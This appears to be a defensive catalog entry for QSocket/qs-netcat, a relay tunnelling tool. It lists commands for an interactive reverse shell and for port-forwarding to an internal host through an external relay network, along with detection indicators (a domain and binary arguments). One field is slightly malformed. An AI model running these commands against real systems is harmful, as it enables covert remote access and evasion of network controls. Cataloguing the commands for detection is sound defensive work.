---
Name: Qsocket
Description: QSocket is a Go port of the Global Socket Toolkit that allows two hosts behind NAT/Firewall to establish an E2E encrypted TCP connection with each other through the Quantum Socket Relay Network (QSRN), using tools such as qs-netcat. Can be abused for reverse shells, port forwarding, SOCKS proxying and data transfer.
Author: QSocket (qsocket)
Created: 2026-08-17
Commands:
  - Command: qs-netcat -s MySecret -l -i
    Description: Server-side of a reverse PTY shell. Spawns a true interactive login shell when a client connects using the same secret.
    Usecase: Interactive reverse shell access to a host behind NAT/firewall.
    Category: Access
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS

  - Command: qs-netcat -s MySecret -i
    Description: Client-side connection to the qs-netcat listening server, giving a real interactive PTY shell.
    Usecase: Connecting to a reverse shell hosted behind NAT/firewall.
    Category: Access
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS

  - Command: qs-netcat -s MySecret -l -f 192.168.6.7:22
    Description: Port-forwards connections to 192.168.6.7:22 on the server's private network via the QSRN.
    Usecase: Reach an internal host/service on a NAT'd network.
    Category: Access
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS
Full_Path:
a  - Filename: qs-proxy
Detection:
  - Domain: '*.qsocket.io'
  - Command: Execution of qs-netcat/qs-lite/qs-proxy binaries, including with -s <secret>, -l, -i, -e or -f arguments.
Resources:
  - Link: https://qsocket.io/
  - Link: https://github.com/qsocket/qsocket
  - Link: https://github.com/qsocket/qs-netcat
Acknowledgement:
  - Person: Jeffrey Tigchelaar-Moerbeek
---